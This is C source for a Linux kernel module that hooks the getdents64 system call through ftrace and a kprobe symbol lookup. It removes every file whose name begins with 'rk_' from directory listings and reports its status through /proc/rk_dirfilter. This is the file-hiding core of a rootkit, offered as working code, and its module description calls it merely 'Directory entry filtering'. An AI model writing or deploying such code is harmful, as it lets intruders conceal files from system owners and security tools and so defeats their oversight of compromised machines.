// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define HIDDEN_PREFIX "rk_"
#define ENDBR_SIZE 4

static struct proc_dir_entry *proc_entry;
static unsigned long sys_getdents64_addr;

typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs *);
static sys_getdents64_t orig_getdents64;

static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

static long strip_entries(char *buf, long total)
{
	struct linux_dirent64 *cur;
	long off = 0;

	while (off < total) {
		cur = (struct linux_dirent64 *)(buf + off);

		if (strncmp(cur->d_name, HIDDEN_PREFIX,
			    sizeof(HIDDEN_PREFIX) - 1) == 0) {
			long rest = total - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off, buf + off + cur->d_reclen,
					rest);
			total -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}
	return total;
}

static asmlinkage long filtered_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent;
	long ret;
	char *buf;

	ret = orig_getdents64(regs);
	if (ret <= 0)
		return ret;

	dirent = (struct linux_dirent64 __user *)regs->si;

	buf = kvmalloc(ret, GFP_KERNEL);
	if (!buf)
		return ret;

	if (copy_from_user(buf, dirent, ret)) {
		kvfree(buf);
		return ret;
	}

	ret = strip_entries(buf, ret);
	copy_to_user(dirent, buf, ret);

	kvfree(buf);
	return ret;
}

static void notrace redirect_getdents64(unsigned long ip, unsigned long parent_ip,
					struct ftrace_ops *ops,
					struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (!regs || within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)filtered_getdents64;
}

static struct ftrace_ops dirfilter_ops = {
	.func  = redirect_getdents64,
	.flags = FTRACE_OPS_FL_SAVE_REGS
	       | FTRACE_OPS_FL_IPMODIFY
	       | FTRACE_OPS_FL_RECURSION,
};

static int install_hook(void)
{
	int err;

	sys_getdents64_addr = lookup_name("__x64_sys_getdents64");
	if (!sys_getdents64_addr)
		return -ENOENT;

	orig_getdents64 = (sys_getdents64_t)(sys_getdents64_addr - ENDBR_SIZE);

	err = ftrace_set_filter_ip(&dirfilter_ops, sys_getdents64_addr, 0, 0);
	if (err)
		return err;

	err = register_ftrace_function(&dirfilter_ops);
	if (err) {
		ftrace_set_filter_ip(&dirfilter_ops, sys_getdents64_addr, 1, 0);
		return err;
	}
	return 0;
}

static void remove_hook(void)
{
	unregister_ftrace_function(&dirfilter_ops);
	ftrace_set_filter_ip(&dirfilter_ops, sys_getdents64_addr, 1, 0);
}

static ssize_t status_show(struct file *file, char __user *buffer,
			   size_t count, loff_t *position)
{
	static const char msg[] = "hidden\n";

	return simple_read_from_buffer(buffer, count, position,
				       msg, sizeof(msg) - 1);
}

static const struct proc_ops status_ops = {
	.proc_read = status_show,
};

static int __init dirfilter_init(void)
{
	int err;

	err = install_hook();
	if (err)
		return err;

	proc_entry = proc_create("rk_dirfilter", 0444, NULL, &status_ops);
	if (!proc_entry) {
		remove_hook();
		return -ENOMEM;
	}

	pr_info("rk: getdents64 hook installed\n");
	return 0;
}

static void __exit dirfilter_exit(void)
{
	proc_remove(proc_entry);
	remove_hook();
	pr_info("rk: getdents64 hook removed\n");
}

module_init(dirfilter_init);
module_exit(dirfilter_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Directory entry filtering via getdents64");
